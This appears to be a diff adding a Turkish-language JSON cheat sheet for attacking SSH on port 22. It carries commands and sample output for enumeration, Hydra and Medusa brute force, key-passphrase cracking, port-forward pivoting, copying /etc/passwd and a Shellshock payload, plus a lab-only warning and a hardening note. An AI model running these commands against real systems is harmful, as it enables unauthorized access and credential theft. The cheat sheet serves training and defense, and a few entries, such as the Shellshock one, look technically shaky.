@@ -1,0 +1,116 @@
+{
+  "port": 22,
+  "service": "SSH",
+  "protocol": "TCP",
+  "description": "Secure Shell — şifreli uzak yönetim protokolü. Güvenli olarak tasarlanmış olsa da yanlış yapılandırma ve zayıf kimlik bilgileri büyük risk oluşturur.",
+  "risk": "medium",
+  "sections": [
+    {
+      "id": "enum",
+      "title": "SSH Enumeration (Nmap)",
+      "commands": [
+        {
+          "label": "Versiyon Tespiti",
+          "command": "nmap -sV -p 22 192.168.1.105",
+          "description": "SSH servis versiyonunu tespit et — eski sürümlerde CVE kontrolü yap",
+          "output": "22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10"
+        },
+        {
+          "label": "SSH Script Taraması",
+          "command": "nmap -p 22 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos 192.168.1.105",
+          "description": "Desteklenen kimlik doğrulama yöntemleri, host key ve algoritmaları listele",
+          "output": "| ssh-auth-methods:\n|   Supported authentication methods:\n|     password\n|     publickey\n| ssh-hostkey:\n|   2048 aa:bb:cc:... (RSA)"
+        },
+        {
+          "label": "Kullanıcı Enumeration (CVE-2018-15473)",
+          "command": "ssh-audit 192.168.1.105",
+          "description": "OpenSSH 7.7 öncesi sürümlerde kullanıcı adı enumeration zafiyeti",
+          "tip": "ssh-audit kurulumu: pip3 install ssh-audit"
+        }
+      ]
+    },
+    {
+      "id": "bruteforce",
+      "title": "SSH Brute Force",
+      "commands": [
+        {
+          "label": "Hydra — Kullanıcı + Wordlist",
+          "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.105 -t 4",
+          "description": "Senaryo: Bilinen kullanıcı adı 'admin', rockyou.txt parola listesiyle SSH brute force",
+          "output": "[22][ssh] host: 192.168.1.105 login: admin password: password123",
+          "flags": [
+            "-l admin → tek kullanıcı",
+            "-L users.txt → kullanıcı listesi",
+            "-P wordlist.txt → parola listesi",
+            "-t 4 → 4 paralel thread",
+            "-s PORT → port belirt"
+          ],
+          "warning": "Yalnızca yetkili lab ortamında kullanın."
+        },
+        {
+          "label": "Medusa — Alternatif Brute Force",
+          "command": "medusa -h 192.168.1.105 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh -t 4",
+          "description": "Medusa ile SSH brute force — Hydra'ya alternatif"
+        },
+        {
+          "label": "Nmap SSH Brute Force Script",
+          "command": "nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.105",
+          "description": "Nmap NSE scriptiyle brute force",
+          "warning": "Yavaştır, sadece küçük listelerle kullanın."
+        }
+      ]
+    },
+    {
+      "id": "access",
+      "title": "SSH ile Bağlanma ve Komutlar",
+      "commands": [
+        {
+          "label": "Parola ile SSH",
+          "command": "ssh admin@192.168.1.105",
+          "description": "Parola ile SSH bağlantısı"
+        },
+        {
+          "label": "Private Key ile SSH",
+          "command": "ssh -i id_rsa admin@192.168.1.105",
+          "description": "Ele geçirilmiş private key ile giriş",
+          "tip": "chmod 600 id_rsa — key dosyası group/other tarafından okunabilirse SSH reddeder"
+        },
+        {
+          "label": "Local Port Forwarding",
+          "command": "ssh -L 8080:localhost:80 admin@192.168.1.105",
+          "description": "Senaryo: Hedef sistemin iç portunu kendi makinene tünel et",
+          "tip": "Artık localhost:8080 adresinde hedefin iç webini görürsün"
+        },
+        {
+          "label": "Dynamic Port Forwarding (SOCKS Proxy)",
+          "command": "ssh -D 1080 admin@192.168.1.105",
+          "description": "Senaryo: Tüm trafiği SSH üzerinden SOCKS5 proxy ile yönlendir (pivoting)",
+          "tip": "proxychains nmap -sT 10.0.0.0/24 ile iç ağı tara"
+        },
+        {
+          "label": "SCP ile Dosya Transfer",
+          "command": "scp admin@192.168.1.105:/etc/passwd ./",
+          "description": "Hedef sistemden dosya kopyala"
+        }
+      ]
+    },
+    {
+      "id": "exploit",
+      "title": "SSH Exploit ve Zafiyetler",
+      "commands": [
+        {
+          "label": "id_rsa Kırma (John the Ripper)",
+          "command": "ssh2john id_rsa > id_rsa.hash && john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt",
+          "description": "Senaryo: Parola korumalı private key'i kır",
+          "output": "id_rsa:          (passphrase123)"
+        },
+        {
+          "label": "Shellshock üzerinden SSH (CGI varsa)",
+          "command": "ssh -o StrictHostKeyChecking=no user@192.168.1.105 '() { :;}; /bin/bash -i'",
+          "description": "Senaryo: Shellshock zafiyeti varsa SSH üzerinden exploit"
+        }
+      ]
+    }
+  ],
+  "defenseNote": "SSH güvenlik önlemleri: Root login'i devre dışı bırak (PermitRootLogin no). Parola kimlik doğrulamayı kapat, yalnızca key kullan (PasswordAuthentication no). fail2ban ile brute force'u engelle. SSH port'unu değiştir (güvenlik yanılsaması ama logu azaltır). AllowUsers ile erişimi kısıtla. SSH versiyon 2 zorunlu tut (Protocol 2). İzin verilen algoritmaları kısıtla (KexAlgorithms, Ciphers)."
+}
